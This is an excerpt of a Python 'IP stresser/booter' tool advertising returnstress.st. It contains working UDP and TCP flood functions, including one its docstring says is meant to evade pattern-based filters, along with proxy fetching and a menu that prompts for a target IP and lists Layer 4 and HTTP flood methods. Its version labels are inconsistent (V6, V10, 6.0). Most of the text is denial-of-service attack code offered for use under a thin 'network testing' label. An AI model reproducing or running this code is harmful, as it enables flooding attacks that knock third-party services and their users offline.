...
# Set window title
os.system("title Free IP Stresser Booter V6 - returnstress.st")

# Modern ASCII Art — Free IP Stresser Booter
ASCII_ART = f"{Fore.LIGHTBLUE_EX}" \
            f"╔════════════════════════════════════╗\n" \
            f"║   Free IP Stresser Booter V10      ║\n" \
            f"║   Powered by returnstress.st       ║\n" \
            f"║   Advanced Network Testing Suite   ║\n" \
            f"╚════════════════════════════════════╝{Style.RESET_ALL}"

# Fetch HTTP proxies with fallback source
def fetch_proxies():
    urls = [
    ...
    for url in urls:
        try:
            ...
            logging.debug(f"Proxy source failed: {e}")
            continue
    return []

PROXIES = fetch_proxies()

# Download HTTP proxy list (tries multiple sources)
def download_proxy_list():
    ...
    for url in urls:
        try:
            ...
            logging.info("Proxy list saved to proxy_list.txt")
            return
        except requests.RequestException as e:
            logging.debug(f"Download failed: {e}")
            continue
    logging.error("Proxy list download failed for all sources")
...
def udp_pulse(ip, port, duration, packet_size):
    """Periodic burst-style UDP for load spikes."""
    stresser = Stresser(ip, port, duration, packet_size)
    payload = bytes.fromhex("CAFEBABE") + random.randbytes(max(1, packet_size - 4))
    logging.info(f"Launching UDP Pulse (burst) on {ip}:{port} for {duration}s")
    sock = create_socket(sock_type=socket.SOCK_DGRAM)
    try:
        while time.time() < stresser.end_time:
            for _ in range(50):
        ...
        logging.error(f"UDP Pulse Error: {e}")
    finally:
        sock.close()
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")

def udp_vandal(ip, port, duration, packet_size):
    """Random junk payloads to evade pattern-based filters."""
    stresser = Stresser(ip, port, duration, packet_size)
    templates = [b"X", b"\x00", b"\xff", b"RND", bytes([random.randint(0, 255) for _ in range(4)])]
    logging.info(f"Launching UDP Vandal on {ip}:{port} for {duration}s")
    sock = create_socket(sock_type=socket.SOCK_DGRAM)
    try:
        while time.time() < stresser.end_time:
            base = random.choice(templates)
            payload = (base * (packet_size // len(base) + 1))[:packet_size] if packet_size else base
            sock.sendto(payload, (ip, port))
            stresser.stats["packets"] += 1
            time.sleep(0.0008)
    except Exception as e:
        logging.error(f"UDP Vandal Error: {e}")
    finally:
        sock.close()
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")
...
def tcp_rampage(ip, port, duration, packet_size):
    """Aggressive multi-thread TCP connect flood."""
    stresser = Stresser(ip, port, duration, packet_size)
    logging.info(f"Launching TCP Rampage on {ip}:{port} for {duration}s")
    with ThreadPoolExecutor(max_workers=15) as executor:
        for _ in range(15):
            executor.submit(stresser._tcp_connect)
    logging.info(f"Completed: {stresser.stats['connections']} connections made")

def tcp_flood_x(ip, port, duration, packet_size):
    """Mixed TCP payload flood (alternating signatures)."""
    stresser = Stresser(ip, port, duration, packet_size)
    payloads = [
        b"FLOOD" + random.randbytes(max(1, packet_size - 5)),
        b"X" * packet_size,
        random.randbytes(packet_size),
    ]
    logging.info(f"Launching TCP Flood-X on {ip}:{port} for {duration}s")
    idx = 0
    sock = create_socket()
    try:
        sock.connect((ip, port))
        while time.time() < stresser.end_time:
            sock.send(payloads[idx % len(payloads)])
            stresser.stats["packets"] += 1
            idx += 1
            time.sleep(0.002)
    except Exception as e:
        logging.error(f"TCP Flood-X Error: {e}")
    finally:
        sock.close()
    logging.info(f"Completed: {stresser.stats['packets']} packets sent")
...
def show_credits():
    ...
    print(f"{Fore.LIGHTBLUE_EX} Powered by: https://returnstress.st{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Version: 6.0{Style.RESET_ALL}")
    print(f"{Fore.LIGHTBLUE_EX} Features: 14 Game, 11 UDP, 11 TCP, 10 HTTP, CheckHost, 20 Tools{Style.RESET_ALL}")
    ...
    while True:
        ...
        if choice == "0":
            ...
            options = {
                ...
                "10": ("Pulse", udp_pulse),
                "11": ("Vandal", udp_vandal),
            }
            print(f"{Fore.LIGHTBLUE_EX}Layer 4 UDP:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-11): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                ip = input(f"{Fore.LIGHTBLUE_EX}Target IP: {Style.RESET_ALL}")
            ...
            options = {
                ...
                "10": ("Rampage", tcp_rampage),
                "11": ("Flood-X", tcp_flood_x),
            }
            ...
            options = {
                ...
                "9": ("Header Flood", http_header_flood),
                "10": ("HTTPS Hammer", https_hammer),
            }
            print(f"{Fore.LIGHTBLUE_EX}Layer 7 HTTP/HTTPS:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-10): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
